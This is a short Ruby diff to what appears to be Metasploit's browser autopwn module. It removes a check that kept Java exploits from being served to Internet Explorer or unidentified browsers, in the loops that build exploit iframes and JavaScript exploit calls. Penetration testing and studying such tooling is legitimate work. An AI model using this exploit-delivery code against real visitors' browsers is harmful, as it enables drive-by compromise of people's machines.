@@ -565,11 +565,6 @@ class Metasploit3 < Msf::Auxiliary
 					body << "<!--[if IE]>\n"
 				end
 				sploits.map do |s|
-
-					# Skip Java modules for IE browsers, since they will stop execution on the first attempt			
-					if (client_info.nil? || [nil, HttpClients::IE].include?(client_info[:ua_name]))
-						next if s[:name].index("java")
-					end
 			
 					body << (s[:prefix_html] || "") + "\n"
 					body << build_iframe(exploit_resource(s[:name])) + "\n"
@@ -733,12 +728,7 @@ class Metasploit3 < Msf::Auxiliary
 				func_name = "exploit#{browser.gsub(/[^a-zA-Z]/, '')}"
 				js << "function #{func_name}() { \n"
 				sploits.map do |s|
-					
-					# Skip Java modules for IE browsers, since they will stop execution on the first attempt			
-					if (client_info.nil? || [nil, HttpClients::IE].include?(client_info[:ua_name]))
-						next if s[:name].index("java")
-					end
-					
+										
 					# get rid of newlines and escape quotes
 					test = s[:vuln_test].gsub("\n",'').gsub("'", "\\\\'")
 					# shouldn't be any in the resource, but just in case...
